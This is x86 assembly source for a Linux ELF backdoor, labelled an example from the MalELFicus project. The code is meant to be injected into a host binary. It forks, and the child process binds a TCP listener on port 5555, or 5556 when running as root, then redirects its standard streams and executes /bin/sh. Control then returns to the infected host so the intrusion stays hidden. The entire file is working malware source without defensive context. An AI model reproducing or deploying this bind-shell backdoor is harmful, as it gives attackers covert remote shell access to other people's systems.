        ;; backdoor.asm
        ;; MalELFicus example of a backdoor
        ;; Author: i4k
        ;;
        ;; based on amon backdoor
        ;; Tested on - debian (kernel 3.10-rc3)

        %include "syscall.inc.asm"
        %include "util.inc.asm"

        %define         LISTEN          4
        %define         SIGKILL         9

        BITS 32

_backdoor:
        push    eax
        push    ebx
        push    ecx
        push    edx
        push    esi
        push    edi

        prologue

        call    bomb

return_to_host:
        epilogue
        pop     edi
        pop     esi
        pop     edx
        pop     ecx
        pop     ebx
        pop     eax

        mov     eax,0x37333331
        jmp     eax


bomb:
        prologue

        xor     eax, eax
        mov     al, sys_fork
        int     0x80

        test    eax, eax
        je      bindshell          ; the son bind the shell

        epilogue
        ret                        ; the parent exit

bindshell:
        prologue
        xor     eax, eax
        cdq

        ;; socket(family, type, proto)
        mov     al, sys_socketcall
        push    edx                ; 0=IP
        inc     edx
        push    edx                ; 1=SOCK_STREAM
        inc     edx
        push    edx                ; 2=AF_INET

        mov     ecx, esp
        push    byte 1
        pop     ebx                ; 1 -> socket
        int     0x80

        ;; bind(socket, addr, lenght)
        mov     edi, eax
        cdq
        xor     ecx, ecx

        mov     cx, 0xB315
        xor     eax, eax
        mov     al, sys_getuid
        int     0x80
        test    eax, eax        ;if uid != 0
        jne     binduser        ;goto binduser
        inc     ch              ;

binduser:
        push    edx
        push    word cx         ; port = 5556 if uid(0) else port =  5555
        inc     ebx
        push    bx              ; (0002 = AF_INET)
        mov     ecx, esp        ; ecx = offset sockaddr struct
        push    byte 16         ; len
        push    ecx             ; push offset sockaddr struct
        push    edi             ; handle socket
        mov     ecx, esp
        xor     eax, eax
        mov     al, sys_socketcall
        int     0x80

;If bind fail the process send to himself a SIGKILL
        test    eax, eax
        je      listen
        xor     eax, eax
        mov     al, sys_getpid
        int     0x80

        xchg    ebx, eax
        xor     ecx, ecx
        mov     cl, SIGKILL
        xor     eax, eax
        mov     al, sys_kill
        int     0x80

;listen(socket, backlog)
listen:
        mov     al, sys_socketcall
        mov     bl, LISTEN
        int     0x80

;accept(socket, addr, len)
        push    eax
        push    edi
        mov     ecx, esp
        inc     ebx             ; 5 -> accept
        mov      al, sys_socketcall
        int     0x80

;dup2()
dup:
        mov     ecx, ebx
        mov     ebx, eax
        dec     ecx
        mov      al, sys_dup2
        int     0x80
        inc     ecx
        loop    dup

;execve /bin/sh
        mov     al, sys_execve
        push    ecx
        push    0x68732f6e
        push    0x69622f2f
        mov     ebx, esp
        push    ecx
        push    ebx
        mov     ecx, esp
        int     0x80
